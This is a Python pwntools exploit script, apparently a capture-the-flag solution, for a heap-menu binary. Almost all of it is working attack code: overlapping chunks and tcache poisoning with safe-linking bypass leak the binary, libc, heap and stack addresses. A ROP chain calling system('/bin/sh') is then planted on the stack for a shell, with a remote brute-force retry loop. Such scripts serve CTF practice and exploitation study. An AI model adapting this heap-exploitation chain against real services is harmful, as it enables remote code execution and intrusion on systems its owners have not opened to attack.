#!/usr/bin/env python3

from time import time
import pwn
import random

exe = pwn.ELF("./main_patched")
libc = pwn.ELF("./libc.so.6")
ld = pwn.ELF("./ld-linux-x86-64.so.2")

pwn.context.binary = exe
pwn.context.delete_corefiles = True
pwn.context.rename_corefiles = False
pwn.context.timeout = 2000

host = pwn.args.HOST or '127.0.0.1'
port = int(pwn.args.PORT or 1337)


def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if pwn.args.GDB:
        return pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return pwn.process([exe.path] + argv, *a, **kw)


def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = pwn.connect(host, port)
    if pwn.args.GDB:
        pwn.gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if pwn.args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)


gdbscript = '''
b* main
source ~/Downloads/pwndbg/gdbinit.py
continue
'''.format(**locals())

"""
alloc(0x10, b"YY")
alloc(0x10, b"YY")
alloc(0x10, b"YY")
alloc(0x10, b"YY")
alloc(0x10, b"YY")
alloc(0x10, b"YY")

for i in range(6):
    delete(i)

for i in range(7, 7+7):
    alloc(100, b"Y")

alloc(100, b"YY")
alloc(100, b"YY")
alloc(100, b"YY")
alloc(100, b"YY")

for i in range(7, 7+7):
    delete(i)

delete(16)
"""

def attach_gdb():
    if pwn.args.GDB:
        pwn.gdb.attach(r, gdbscript="""
source ~/Downloads/pwndbg/gdbinit.py
        """)

def run():

    io = start()

    def alloc(size, data, newline=True):
        io.sendlineafter(b"> ", b"1")
        io.sendlineafter(b"size: ", str(size).encode())
        io.sendafter(b"data: ", data)
        if newline: io.sendline()

    def delete(idx):
        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b": ", str(idx).encode())

    def view(chunk_id):
        io.sendlineafter(b"> ", b"3")
        io.sendlineafter(b"id: ", str(chunk_id).encode())
        return io.recvuntil(b"1. Add", drop=True)


    alloc(0x20, (pwn.p64(0) + pwn.p64(0x71)) * 2)
    alloc(0x30, (pwn.p64(0) + pwn.p64(0x71)) * 3)
    delete(0)
    delete(1)
    alloc(24, b"")

    bss_offt = 0x4160

    if pwn.args.REMOTE:
        heap = ((pwn.u64(view(2)[:8]) << 12) & 0xfffffffffff00000) | 0x11000 # bruteforce
        exe.address = heap-0x100000
    else:
        heap = (((pwn.u64(view(2)[:8]) & ~0xff) | 0x59) << 12)
        
        exe.address = (((heap >> 20) << 8) | 0x54) << 12 
        pwn.log.info(f"bin: {hex(exe.address)}")

    alloc(0x40, (pwn.p64(0) + pwn.p64(0x71)) * 4)
    alloc(0x50, (pwn.p64(0) + pwn.p64(0x71)) * 4)
    delete(3)
    delete(4)
    got_offset = 0x3f90
    alloc(24, pwn.p64(bss_offt+8) + pwn.p64(1) + pwn.p64(exe.address), newline=False)
    
    leak = view(3)

    """
0x1e04000
0x1f49000
0x1e67000
0x104d000
0xdec000
0x513000
0xdad000
0xa92000
0x640000
0x1db7000
    """

    offset = 0
    if leak[:4] == b"\x7fELF":
        pass
    elif leak[:4] == b"\xf3\x0f\x1e\xfa":
        offset = 0x1000
    elif leak[:4] == b"\x01\x00\x02\x00":
        offset = 0x1000 * random.randint(2, 3)
    # elif leak == b'[-] failed to write from buffer\n':
    else:
        pass
        io.close()
        return False

    if pwn.args.LOCAL:
        assert(not offset)

    exe.address -= offset
    got_offset -= offset
    bss_offt -= offset

    print(hex(offset))
    libc.address = pwn.u64(leak[got_offset:got_offset+8]) - libc.sym["free"]
    print(f"exe @ {hex(exe.address)}")
    print(f"libc @ {hex(libc.address)}")

    print(leak)

    heap = pwn.u64(leak[bss_offt - 0x100:bss_offt - 0x100 +8]) - 0x2a0 
    pwn.log.info(f"heap: {hex(heap)}")

    delete(2)
    alloc(0x18, pwn.p64(8) + pwn.p64(1) + pwn.p64(libc.address + 0x26b2d0))

    stack = pwn.u64(view(0)[:8])
    pwn.log.info(f"stack: {hex(stack)}")

    alloc(0x43, (pwn.p64(0) + pwn.p64(0x71)) * 4)
    alloc(0x43, (pwn.p64(0) + pwn.p64(0x71)) * 4)
    alloc(0x43, (pwn.p64(0) + pwn.p64(0x71)) * 4)

    # delete(7)
    delete(8)
    delete(9)

    delete(2)
    # alloc(0x18, pwn.p64(8) + pwn.p64(1) + pwn.p64(stack - 0x183)) # tp âtcvh
    alloc(0x18, pwn.p64(8) + pwn.p64(1) + pwn.p64(heap + 0x4b0)) # tp âtcvh

    delete(0)

    alloc(0x64, pwn.p64(0)*3 + pwn.p64(0x21) + pwn.p64(((heap + 0x4d0) >> 12) ^ (heap + 0x460)) + pwn.p64(0x1337) + pwn.p64(0) + pwn.p64(0x51) + pwn.p64(((heap + 0x4b0) >> 12) ^ (stack - 0x138)))
    
    rop = pwn.ROP(libc)
    binsh = next(libc.search(b"/bin/sh\x00"))
    rop.execve(binsh, 0, 0)

    # # 0x00000000000018e3 : pop rdi ; ret

    alloc(0x45, b"looooooool")
    alloc(0x45, pwn.p64(1337) + pwn.p64(exe.address + 0x00000000000018e3) +  pwn.p64(binsh)+ pwn.p64(exe.address + 0x000000000000101a) + pwn.p64(libc.sym.system))

    io.interactive()

if pwn.args.REMOTE:
    i = 0
    while not run():
        print(i)
        i += 1
        pass
        # break
else:
    run()